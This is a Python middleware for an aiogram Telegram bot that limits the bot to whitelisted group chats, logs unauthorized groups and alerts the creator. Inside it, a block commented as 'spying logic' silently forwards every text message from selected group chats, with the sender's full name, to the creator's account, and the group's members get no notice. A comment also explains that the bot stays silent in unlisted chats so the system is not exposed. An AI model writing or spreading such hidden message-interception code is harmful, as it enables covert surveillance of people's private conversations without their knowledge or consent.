from typing import Callable, Dict, Any, Awaitable
from aiogram import BaseMiddleware
from aiogram.types import Message, CallbackQuery

from database.whitelist import get_whitelist, log_unauthorized_chat
from bot.config import CREATOR_ID

class WhitelistMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[Message | CallbackQuery, Dict[str, Any]], Awaitable[Any]],
        event: Message | CallbackQuery,
        data: Dict[str, Any]
    ) -> Any:

        chat = event.message.chat if isinstance(event, CallbackQuery) else event.chat

        # Разрешить личные сообщения с ботом (для админа и т.д.)
        if chat.type == "private":
            return await handler(event, data)

        # Логика шпионажа
        from database.spy import get_spy_chats
        spy_chats = await get_spy_chats()
        if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and CREATOR_ID != 0:
            bot = data.get('bot')
            if bot and event.text:
                try:
                    await bot.send_message(
                        chat_id=CREATOR_ID,
                        text=f"👁 [<code>{chat.id}</code>] <b>{event.from_user.full_name}</b>: {event.text}"
                    )
                except Exception:
                    pass

        whitelist = await get_whitelist()

        if chat.id not in whitelist:
            # Логируем попытку использования
            is_new = await log_unauthorized_chat(chat.id, chat.title or "Unknown")

            # Отправляем уведомление админу, если это новая группа, или если кто-то настойчиво пишет
            if CREATOR_ID and CREATOR_ID != 0 and is_new:
                bot = data.get('bot')
                if bot:
                    try:
                        await bot.send_message(
                            chat_id=CREATOR_ID,
                            text=(
                                f"⚠️ <b>Попытка использования в неразрешенной группе!</b>\n\n"
                                f"Название: <b>{chat.title}</b>\n"
                                f"ID группы: <code>{chat.id}</code>\n\n"
                                f"<i>Чтобы разрешить работу, введите:</i>\n"
                                f"<code>/allow {chat.id}</code>"
                            )
                        )
                    except Exception as e:
                        print(f"Ошибка мидлвари: {e}")

            # Мы убрали ответ в чат, чтобы не палить систему и не выдавать сообщение от создателя.

            # Блокируем дальнейшую обработку
            return

        return await handler(event, data)
